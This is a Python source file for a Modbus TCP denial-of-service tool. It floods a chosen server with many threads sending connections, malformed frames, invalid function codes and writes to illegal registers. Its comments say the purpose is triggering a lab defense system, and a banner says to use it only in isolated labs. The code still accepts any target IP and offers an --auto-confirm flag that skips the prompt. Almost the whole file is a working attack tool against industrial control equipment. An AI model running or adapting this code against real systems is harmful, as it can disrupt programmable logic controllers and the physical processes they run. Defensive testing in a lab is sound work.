from pyModbusTCP.client import ModbusClient
import socket
import struct
import threading
import time
import logging
import argparse
import random

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class RealModbusDoS:
    def __init__(self, target_host, target_port, attack_type='flood', threads=5, duration=20):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.threads = min(threads, 10)
        self.duration = min(duration, 30)
        self.running = False
        self.stats = {'connections': 0, 'packets': 0, 'errors': 0}
        self.threads_list = []

    def real_flood_attack(self):
        """Real flood attack that WILL trigger defense"""
        logging.info(f'[REAL-FLOOD] Starting flood attack thread')
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                
                self.stats['connections'] += 1
                
                # Send MALICIOUS packets that definitely trigger defense
                for _ in range(8):
                    # Use suspicious function codes
                    malicious_func = random.choice([90, 91, 92, 93, 94, 95, 99])
                    packet = struct.pack('>HHHBBHH', 
                                       random.randint(0, 65535),
                                       0, 
                                       6,
                                       1,
                                       malicious_func,  # MALICIOUS!
                                       0,
                                       100)             # Large quantity
                    
                    sock.send(packet)
                    self.stats['packets'] += 1
                    time.sleep(0.03)
                
                sock.close()
                
                if self.stats['packets'] % 20 == 0:
                    logging.info(f'[REAL-FLOOD] Progress: {self.stats["packets"]} packets, {self.stats["connections"]} connections')
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)

    def malformed_packet_attack(self):
        """Send malformed packets that trigger defense"""
        logging.info(f'[MALFORMED] Starting malformed packet attack thread')
        
        malformed_packets = [
            b'\x00\x00\x00\x00\x00\x00',  # Too short
            b'\xff\xff\xff\xff\xff\xff\xff\xff',  # All FFs
            struct.pack('>HHHBB', 0, 0, 256, 1, 99),  # Invalid function code
            struct.pack('>HHHBB', 0, 0, 6, 1, 90),   # Suspicious function code
            b'\x00' * 500,  # Large null packet
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                
                # Send multiple malformed packets
                for i in range(10):
                    packet = random.choice(malformed_packets)
                    try:
                        sock.send(packet)
                        self.stats['packets'] += 1
                        time.sleep(0.02)
                    except:
                        break
                
                sock.close()
                
                if self.stats['packets'] % 15 == 0:
                    logging.info(f'[MALFORMED] Progress: {self.stats["packets"]} malformed packets sent')
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)

    def start_real_attack(self):
        """Start the real attack"""
        self.running = True
        start_time = time.time()
        
        logging.warning('=' * 60)
        logging.warning(f'🚀 STARTING REAL {self.attack_type.upper()} ATTACK')
        logging.warning(f'🎯 Target: {self.target_host}:{self.target_port}')
        logging.warning(f'🧵 Threads: {self.threads}')
        logging.warning(f'⏱️ Duration: {self.duration}s')
        logging.warning('=' * 60)
        
        # Start attack threads
        self.threads_list = []
        for i in range(self.threads):
            if self.attack_type == 'flood':
                t = threading.Thread(target=self.real_flood_attack, daemon=True, name=f"FloodThread-{i}")
            elif self.attack_type == 'malformed':
                t = threading.Thread(target=self.malformed_packet_attack, daemon=True, name=f"MalformedThread-{i}")
            else:  # all
                if i % 2 == 0:
                    t = threading.Thread(target=self.real_flood_attack, daemon=True, name=f"FloodThread-{i}")
                else:
                    t = threading.Thread(target=self.malformed_packet_attack, daemon=True, name=f"MalformedThread-{i}")
            
            t.start()
            self.threads_list.append(t)
        
        # Run for specified duration
        try:
            while time.time() - start_time < self.duration and self.running:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                if int(elapsed) % 5 == 0:
                    logging.info(f'Attack progress: {elapsed:.1f}s / {self.duration}s | '
                                f'Packets: {self.stats["packets"]} | '
                                f'Connections: {self.stats["connections"]} | '
                                f'Errors: {self.stats["errors"]}')
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            logging.warning('Attack interrupted by user')
        
        self.running = False
        logging.info('Stopping attack threads...')
        
        for t in self.threads_list:
            t.join(timeout=3)
        
        logging.warning('=' * 60)
        logging.warning('🎯 REAL ATTACK COMPLETED')
        logging.info(f'Final stats - Packets: {self.stats["packets"]} | '
                    f'Connections: {self.stats["connections"]} | '
                    f'Errors: {self.stats["errors"]}')
        logging.warning('=' * 60)

    def stop_attack(self):
        """Stop the attack"""
        self.running = False

class ModbusDoS:
    def __init__(self, target_host, target_port, attack_type='flood', threads=10, duration=30):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.threads = min(threads, 50)
        self.duration = min(duration, 300)
        self.running = False
        self.stats = {'connections': 0, 'packets': 0, 'errors': 0}
        self.threads_list = []

    def connection_flood(self):
        """Flood target with TCP connections - MALICIOUS VERSION"""
        logging.info(f'[FLOOD] Starting connection flood against {self.target_host}:{self.target_port}')
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                start_conn = time.time()
                sock.connect((self.target_host, self.target_port))
                connect_time = time.time() - start_conn
                
                self.stats['connections'] += 1
                
                # Send MALICIOUS packets to trigger defense
                try:
                    # Suspicious function codes that should trigger defense
                    malicious_funcs = [90, 91, 92, 93, 94, 95]
                    func_code = random.choice(malicious_funcs)
                    
                    request = struct.pack('>HHHBBHH', 
                                        random.randint(0, 65535),
                                        0, 
                                        6, 
                                        1, 
                                        func_code,  # MALICIOUS function code
                                        0, 
                                        100)        # Large quantity
                    sock.send(request)
                    self.stats['packets'] += 1
                except:
                    pass
                
                # Keep connection open for a bit
                time.sleep(0.3)
                sock.close()
                
                if self.stats['connections'] % 5 == 0:  # Češći logging
                    logging.info(f'[FLOOD] Connections: {self.stats["connections"]}, Connect time: {connect_time:.3f}s')
                
                time.sleep(0.05)  # Manji delay za veći flood
                
            except Exception as e:
                self.stats['errors'] += 1
                if self.stats['errors'] % 10 == 0:
                    logging.warning(f'[FLOOD] Connection errors: {self.stats["errors"]}')
                time.sleep(0.1)

    def malformed_packet_flood(self):
        """Send malformed Modbus packets that SHOULD TRIGGER DEFENSE"""
        logging.info(f'[MALFORMED] Starting malformed packet flood against {self.target_host}:{self.target_port}')
        
        # MALICIOUS packets designed to trigger defense system
        malformed_packets = [
            b'\x00\x00\x00\x00\x00\x00',  # Too short
            b'\xff\xff\xff\xff\xff\xff\xff\xff',  # All FFs
            b'\x00\x01\x00\x00\x00\xff\x01\x03\x00\x00\xff\xff',  # Invalid length
            struct.pack('>HHHBB', 0, 0, 256, 1, 99),  # Invalid function code 99
            struct.pack('>HHHBB', 0, 0, 6, 1, 90),   # Suspicious function code 90
            struct.pack('>HHHBB', 0, 0, 6, 1, 91),   # Suspicious function code 91
            struct.pack('>HHHBB', 0, 0, 6, 1, 92),   # Suspicious function code 92
            b'\x00' * 500,  # Large null packet
            struct.pack('>HHHBBHH', 0, 0, 6, 1, 3, 0xFFFF, 0xFFFF),  # Out of range
            struct.pack('>HHHBBHH', 0, 0, 6, 1, 16, 0, 1000),  # Too many registers
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                
                # Send multiple malformed packets rapidly
                for i in range(15):  # Više paketa po konekciji
                    packet = random.choice(malformed_packets)
                    try:
                        sock.send(packet)
                        self.stats['packets'] += 1
                        time.sleep(0.005)  # Vrlo mali delay za rapid fire
                    except:
                        break
                
                sock.close()
                
                if self.stats['packets'] % 25 == 0:  # Češći logging
                    logging.info(f'[MALFORMED] Packets sent: {self.stats["packets"]}')
                
                time.sleep(0.05)  # Manji delay između konekcija
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)

    def function_code_abuse(self):
        """Abuse Modbus function codes - MALICIOUS VERSION"""
        logging.info(f'[ABUSE] Starting function code abuse against {self.target_host}:{self.target_port}')
        
        while self.running:
            try:
                # Use raw sockets instead of pyModbusTCP for more control
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                
                # Try various suspicious operations
                suspicious_operations = [
                    # Try rarely used function codes
                    struct.pack('>HHHBBHH', random.randint(0,65535), 0, 6, 1, 90, 0, 10),
                    struct.pack('>HHHBBHH', random.randint(0,65535), 0, 6, 1, 91, 0, 10),
                    struct.pack('>HHHBBHH', random.randint(0,65535), 0, 6, 1, 92, 0, 10),
                    # Try writing to system registers
                    struct.pack('>HHHBBHH', random.randint(0,65535), 0, 6, 1, 6, 0xFFFF, 0xDEAD),
                    # Try illegal addresses
                    struct.pack('>HHHBBHH', random.randint(0,65535), 0, 6, 1, 3, 0xFFFF, 100),
                ]
                
                for op in suspicious_operations:
                    try:
                        sock.send(op)
                        self.stats['packets'] += 1
                        time.sleep(0.05)
                    except:
                        break
                
                sock.close()
                
                if self.stats['packets'] % 15 == 0:
                    logging.info(f'[ABUSE] Malicious packets sent: {self.stats["packets"]}')
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.2)

    def start_attack(self):
        """Launch the attack with multiple threads"""
        if self.attack_type not in ['flood', 'malformed', 'abuse', 'all']:
            logging.error(f"Unknown attack type: {self.attack_type}")
            return

        self.running = True
        start_time = time.time()
        
        logging.warning(f'=== STARTING DoS ATTACK: {self.attack_type.upper()} ===')
        logging.warning(f'Target: {self.target_host}:{self.target_port}')
        logging.warning(f'Threads: {self.threads}')
        logging.warning(f'Duration: {self.duration}s')
        logging.warning('='*50)
        
        if self.attack_type == 'flood':
            attack_func = self.connection_flood
        elif self.attack_type == 'malformed':
            attack_func = self.malformed_packet_flood
        elif self.attack_type == 'abuse':
            attack_func = self.function_code_abuse
        elif self.attack_type == 'all':
            attack_funcs = [self.connection_flood, self.malformed_packet_flood, self.function_code_abuse]
        
        self.threads_list = []
        for i in range(self.threads):
            if self.attack_type == 'all':
                func = attack_funcs[i % len(attack_funcs)]
            else:
                func = attack_func
                
            t = threading.Thread(target=func, daemon=True, name=f"AttackThread-{i}")
            t.start()
            self.threads_list.append(t)
        
        try:
            while time.time() - start_time < self.duration and self.running:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                if int(elapsed) % 3 == 0:  # Češći progress report
                    logging.info(f'Attack progress: {elapsed:.1f}s / {self.duration}s | '
                                f'Connections: {self.stats["connections"]} | '
                                f'Packets: {self.stats["packets"]} | '
                                f'Errors: {self.stats["errors"]}')
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            logging.warning('Attack interrupted by user')
        
        self.running = False
        logging.info('Stopping attack threads...')
        
        for t in self.threads_list:
            t.join(timeout=5)
        
        logging.warning('=== ATTACK COMPLETED ===')
        logging.info(f'Final stats - Connections: {self.stats["connections"]} | '
                    f'Packets: {self.stats["packets"]} | '
                    f'Errors: {self.stats["errors"]}')

    def stop_attack(self):
        """Stop the attack"""
        self.running = False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus TCP DoS attack tool (USE ONLY IN LAB ENVIRONMENTS)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack types:
  flood       - TCP connection flooding with malicious packets
  malformed   - Malformed packet flooding (triggers defense)
  abuse       - Function code abuse with suspicious operations
  all         - Combined attack

Examples:
  python modbus_dos_attack.py --target 127.0.0.1 --attack malformed --threads 5
  python modbus_dos_attack.py --target 192.168.1.10 --attack all --duration 30
        """
    )
    parser.add_argument('--target', required=True, help='Target Modbus server IP')
    parser.add_argument('--port', type=int, default=502, help='Target port (default: 502)')
    parser.add_argument('--attack', choices=['flood', 'malformed', 'abuse', 'all'], 
                       default='flood', help='Attack type')
    parser.add_argument('--threads', type=int, default=5, help='Number of attack threads (max: 50)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (max: 300)')
    parser.add_argument('--auto-confirm', action='store_true', help='Auto confirm attack without prompt')
    
    args = parser.parse_args()
    
    print('='*60)
    print('WARNING: This tool performs DoS attacks on Modbus servers.')
    print('USE ONLY in isolated lab environments you control.')
    print('='*60)
    
    if args.target in ['127.0.0.1', 'localhost'] or args.auto_confirm:
        print(f'Attacking {args.target}:{args.port} with {args.attack} attack')
        
        # Use the REAL attack for better results
        real_attacker = RealModbusDoS(
            target_host=args.target,
            target_port=args.port,
            attack_type=args.attack,
            threads=args.threads,
            duration=args.duration
        )
        
        try:
            real_attacker.start_real_attack()
        except KeyboardInterrupt:
            real_attacker.stop_attack()
            print('Attack stopped by user.')
    else:
        response = input(f'Attack {args.target}:{args.port} with {args.attack}? (yes/no): ')
        if response.lower() != 'yes':
            print('Attack cancelled.')
            exit(0)
        
        real_attacker = RealModbusDoS(
            target_host=args.target,
            target_port=args.port,
            attack_type=args.attack,
            threads=args.threads,
            duration=args.duration
        )
        
        try:
            real_attacker.start_real_attack()
        except KeyboardInterrupt:
            real_attacker.stop_attack()
            print('Attack stopped by user.')